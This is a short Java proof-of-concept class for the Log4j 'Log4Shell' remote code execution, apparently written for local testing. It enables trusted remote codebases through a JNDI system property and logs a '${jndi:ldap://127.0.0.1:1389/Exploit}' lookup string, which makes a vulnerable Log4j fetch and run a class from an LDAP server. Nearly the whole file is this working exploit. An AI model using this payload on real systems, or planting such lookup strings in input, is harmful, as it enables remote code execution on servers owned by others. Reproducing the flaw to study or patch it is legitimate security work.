package cn.fireflying.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.Appender;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.appender.RollingFileAppender;
import org.apache.logging.log4j.core.appender.rolling.SizeBasedTriggeringPolicy;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.LoggerConfig;
import org.apache.logging.log4j.core.layout.PatternLayout;


/**
 * @author: Fire Flying
 * @create: 2021-12-10 13:22
 **/

public class Log4jRce {


    private static final Logger logger = LogManager.getLogger(Log4jRce.class);

    public static void main(String[] args) throws Exception {

        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");

//        logger.error("${jndi:ldap://127.0.0.1:1389/Exploit/ }");
    }

}
